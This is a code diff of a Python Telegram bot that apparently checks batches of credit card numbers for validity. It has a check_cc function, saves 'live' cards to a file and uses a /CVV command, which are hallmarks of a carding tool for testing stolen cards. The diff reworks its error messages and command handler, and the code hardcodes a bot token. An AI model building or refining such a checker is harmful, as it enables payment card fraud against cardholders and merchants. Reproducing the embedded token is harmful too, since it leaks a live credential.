@@ -42,13 +42,12 @@ async def check_cc(cc, amount, currency, bot, chat_id, username, vip_status, ret
         await bot.send_message(chat_id=chat_id, text=response_message, parse_mode='HTML', disable_web_page_preview=True)
 
     except requests.exceptions.RequestException as e:
+        await bot.send_message(chat_id=chat_id, text=f"Request Exception: {str(e)}")
         if retry_count < MAX_RETRIES:
-            await bot.send_message(chat_id=chat_id, text=f"{cc} Request Exception: {str(e)}. Retrying...")
             time.sleep(1)
             await check_cc(cc, amount, currency, bot, chat_id, username, vip_status, retry_count + 1)
-
     except json.JSONDecodeError as e:
-        await bot.send_message(chat_id=chat_id, text=f"{cc} JSON Decode Error: {str(e)}")
+        await bot.send_message(chat_id=chat_id, text=f"JSON Decode Error: {str(e)}")
 
 def save_live_response(cc, message):
     with open('Live.txt', 'a') as file:
@@ -91,8 +90,8 @@ def main():
     bot_token = "7266886772:AAEhY-yWQSEu7mxMWkJCJyesK_qgqPZlPks"
     application = Application.builder().token(bot_token).build()
 
-    # Handle command for file input, ensure command starts with / and then use regex for .CVV
-    application.add_handler(MessageHandler(filters.Document.MimeType("text/plain") & filters.Regex('^\.CVV$'), process_cards))
+    # Handle command for file input
+    application.add_handler(CommandHandler("CVV", process_cards))
 
     application.run_polling()
 
